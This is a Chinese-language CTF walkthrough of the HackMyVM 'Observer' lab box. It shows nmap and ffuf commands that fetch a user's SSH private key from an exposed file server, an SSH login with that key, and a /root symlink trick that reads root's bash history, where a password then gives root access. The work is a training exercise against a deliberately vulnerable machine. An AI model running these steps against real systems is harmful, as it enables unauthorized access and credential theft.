---
{"dg-publish":true,"title":"hackmyvm_Observer","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_Observer.md","permalink":"/安全/靶机/hackmyvm_Observer/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~/workspace/pentest/hero/rootpass]
└─# arp-scan --interface=eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 00:0c:29:8e:b5:08, IPv4: 192.168.124.27
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.124.1   88:2a:5e:21:1b:ef       New H3C Technologies Co., Ltd
192.168.124.8   10:a5:1d:71:1b:f5       Intel Corporate
192.168.124.31  08:00:27:62:5d:9a       PCS Systemtechnik GmbH

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.692 seconds (95.10 hosts/sec). 3 responded
```

```sh
┌──(root㉿kali)-[~/workspace/pentest/hero/rootpass]
└─# nmap -sT -min-rate 5000 -p- 192.168.124.31
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 21:02 EST
Nmap scan report for 192.168.124.31 (192.168.124.31)
Host is up (0.0070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
3333/tcp open  dec-notes
MAC Address: 08:00:27:62:5D:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 66.56 seconds

```

开了两个端口，`22,3333`,渗透重点应该放在3333上

```sh
┌──(root㉿kali)-[~/workspace/pentest/hero/rootpass]
└─# nmap -sT -sC -sV -O -p22,3333 192.168.124.31
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 21:06 EST
Nmap scan report for 192.168.124.31 (192.168.124.31)
Host is up (0.0027s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)
|_  256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)
3333/tcp open  http    Golang net/http server
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 200 OK
|     Date: Sun, 09 Feb 2025 02:07:05 GMT
|     Content-Length: 105
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST
|     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Date: Sun, 09 Feb 2025 02:06:49 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST
|     <!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Sun, 09 Feb 2025 02:06:49 GMT
|     Content-Length: 78
|     Content-Type: text/plain; charset=utf-8
|     OBSERVING FILE: /home/ NOT EXIST
|     <!-- DaFpLSjFbcXoEFfRsWxPLDnJObCsNVHMV -->
|   OfficeScan:
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

...

MAC Address: 08:00:27:62:5D:9A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.11 seconds

```

3333好像是个web服务

# web渗透

首先看一下默认页面

```sh
┌──(root㉿kali)-[~/sharedir]
└─# curl http://192.168.124.31:3333/
OBSERVING FILE: /home/ NOT EXIST


<!-- aPVQqUQnzXSfBigfpkmlDQoLjksSjFHMV --> 

```
这个最后的字符串，除了后三个字母`HMV`是固定的，其他的像是“随机”生成


很奇怪的输出，暂时不知道啥情况，目录扫描一下
```sh
┌──(root㉿kali)-[~/sharedir]
└─# dirb http://192.168.124.31:3333/ -f

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Feb  8 21:16:20 2025
URL_BASE: http://192.168.124.31:3333/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Fine tunning of NOT_FOUND detection

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.124.31:3333/ ----

-----------------
END_TIME: Sat Feb  8 21:16:54 2025
DOWNLOADED: 4612 - FOUND: 0
```
没什么结果

尝试用ffuf模糊测试一下
```sh
┌──(root㉿kali)-[~/sharedir]
└─# ffuf -u http://192.168.124.31:3333/FUZZ/.ssh/id_rsa -w ~/sharedir/wordlist/usernames.txt -fw 8

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.124.31:3333/FUZZ/.ssh/id_rsa
 :: Wordlist         : FUZZ: /root/sharedir/wordlist/usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8
________________________________________________

jan                     [Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 150ms]
:: Progress: [81475/81475] :: Job [1/1] :: 1587 req/sec :: Duration: [0:01:44] :: Errors: 0 ::

```

看到出现了用户名`jan`
```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# curl http://192.168.124.31:3333/jan/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpPPLa4GEUhEticg3BgiKdz7xOo1lqnQIHs6XcdKcEr0Fr2kY5IxNfLYnx5F4WWeLcwPk1imCYDrtwkA/eGMv2ENJkrZRoTTJcfhOKOMLDLsLhMaVbj0zwzPtvUuwfkENRZkrIcb9hGFrMJuyVWStUWMr2TGFau3WKejCC/YK2fiRBYM+PWA96wU6MtQw/G/x8ei62rAooxxnfup4/N3uJ8/bCILGXKm7R3bPXu9uWAaMjbj0T0Br7+Eoc4FzprIm3ABfByK8qY2snKtIsqj7EiCMXm5XSCt6PVcz9teO/f1nxcX2HgUSex/NQ3gyYv6DyhyWxo7nCBrHlfcC9qZyH+80reSJA7apNLV9FlTpPs720gjc2ZgOHTRFykhkIQDO1KyizpzUFSiPpFqn4qzUNlDNqZC9rvLgauK35SY/QA+0DS9n+9Wmpn7bn0Jdxi+7G46EFjJwR0sdUQWsoPgXLpASQLbte/rJKjJO9a0vVXELNt4DjrWnRTSG+mQ+6MMc= jan@observer

┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# curl http://192.168.124.31:3333/jan/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpPPLa4GEUhEticg3BgiKdz7xOo1lqnQIHs6XcdKcEr0Fr2kY5IxNfLYnx5F4WWeLcwPk1imCYDrtwkA/eGMv2ENJkrZRoTTJcfhOKOMLDLsLhMaVbj0zwzPtvUuwfkENRZkrIcb9hGFrMJuyVWStUWMr2TGFau3WKejCC/YK2fiRBYM+PWA96wU6MtQw/G/x8ei62rAooxxnfup4/N3uJ8/bCILGXKm7R3bPXu9uWAaMjbj0T0Br7+Eoc4FzprIm3ABfByK8qY2snKtIsqj7EiCMXm5XSCt6PVcz9teO/f1nxcX2HgUSex/NQ3gyYv6DyhyWxo7nCBrHlfcC9qZyH+80reSJA7apNLV9FlTpPs720gjc2ZgOHTRFykhkIQDO1KyizpzUFSiPpFqn4qzUNlDNqZC9rvLgauK35SY/QA+0DS9n+9Wmpn7bn0Jdxi+7G46EFjJwR0sdUQWsoPgXLpASQLbte/rJKjJO9a0vVXELNt4DjrWnRTSG+mQ+6MMc= jan@observer
```
可以看到获取私钥可以尝试登录

```sh
wget http://192.168.124.31:3333/jan/.ssh/id_rsa
chmod 600 id_rsa

┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# ssh -i id_rsa jan@192.168.124.31
The authenticity of host '192.168.124.31 (192.168.124.31)' can't be established.
ED25519 key fingerprint is SHA256:1DlVfPPtEPOsfNJWynWUBQaV6QyJptlKBRMCdyjuusg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.124.31' (ED25519) to the list of known hosts.
Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 21 20:21:22 2023 from 192.168.0.100
jan@observer:~$ id
uid=1000(jan) gid=1000(jan) grupos=1000(jan),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
jan@observer:~$ cat user.txt
HMVdDepYxsi8VSucdruB3P7
```


# 提权

```sh
jan@observer:~$ sudo -l
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status

jan@observer:~$ sudo /usr/bin/systemctl -l status
● observer
    State: running
    Units: 235 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Sun 2025-02-09 02:59:49 CET; 44min ago
  systemd: 252.12-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─344 /usr/sbin/cron -f
           │ │ ├─356 /usr/sbin/CRON -f
           │ │ ├─362 /bin/sh -c /opt/observer
           │ │ └─367 /opt/observer
           │ ├─dbus.service
           │ │ └─345 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
           │ ├─ifup@enp0s3.service
           │ │ └─331 dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3
           │ ├─ssh.service
           │ │ └─424 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
           │ ├─system-getty.slice
           │ │ └─getty@tty1.service
           │ │   └─423 /sbin/agetty -o "-p -- \\u" --noclear - linux
           │ ├─systemd-journald.service
           │ │ └─205 /lib/systemd/systemd-journald
           │ ├─systemd-logind.service
           │ │ └─355 /lib/systemd/systemd-logind
           │ ├─systemd-timesyncd.service
           │ │ └─296 /lib/systemd/systemd-timesyncd
           │ └─systemd-udevd.service
           │   └─udev
           │     └─232 /lib/systemd/systemd-udevd
           └─user.slice
             └─user-1000.slice
               ├─session-5.scope
               │ ├─502 "sshd: jan [priv]"
               │ ├─518 "sshd: jan@pts/0"
               │ ├─519 -bash
               │ ├─529 sudo /usr/bin/systemctl -l status
               │ ├─530 sudo /usr/bin/systemctl -l status
               │ ├─531 /usr/bin/systemctl -l status
               │ └─532 less
               └─user@1000.service
                 └─init.scope
                   ├─506 /lib/systemd/systemd --user
                   └─508 "(sd-pam)"

```

让AI分析一下有没有可能提权的地方
![Pasted image 20250209105153.png](/img/user/picture/Pasted%20image%2020250209105153.png)

```sh
jan@observer:~$ ls -l /opt/observer
-rwxr-xr-x 1 root root 7376728 ago 21  2023 /opt/observer


jan@observer:/opt$ ls -l /
total 60
...
drwxr-xr-x   2 root root  4096 ago 21  2023 opt
...
```
额，没有写权限

去看了一下WP，发现这个服务是root权限下运行的，所以他也就能读取root的文件

既然没有办法进行目录穿越，那么我们就在自己目录下软链接root目录
```sh
jan@observer:~$ ln -s /root root
jan@observer:~$ ls -l
total 4
lrwxrwxrwx 1 jan jan  5 feb  9 04:19 root -> /root
-rw------- 1 jan jan 24 ago 21  2023 user.txt
```

```sh
┌──(root㉿kali)-[~/workspace/pentest/Observer]
└─# curl http://192.168.124.31:3333/jan/root/.bash_history
ip a
exit
apt-get update && apt-get upgrade
apt-get install sudo
cd
wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
rm go1.12.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
nano observer.go
go build observer.go
mv observer /opt
ls -l /opt/observer
crontab -e
nano root.txt
chmod 600 root.txt
nano /etc/sudoers
nano /etc/ssh/sshd_config
paswd
fuck1ng0bs3rv3rs
passwd
su jan
nano /etc/issue
nano /etc/network/interfaces
ls -la
exit
ls -la
cat .bash_history
ls -la
ls -la
cat .bash_history
ls -l
cat root.txt
cd /home/jan
ls -la
cat user.txt
su jan
reboot
shutdown -h now

```


可以看到里面密码：
```txt
fuck1ng0bs3rv3rs
```


```sh
jan@observer:~$ su
Contraseña:
root@observer:/home/jan# id
uid=0(root) gid=0(root) grupos=0(root)

root@observer:~# cat root.txt
HMVb6MPDxdYLLC3sxNLIOH1
```

结束

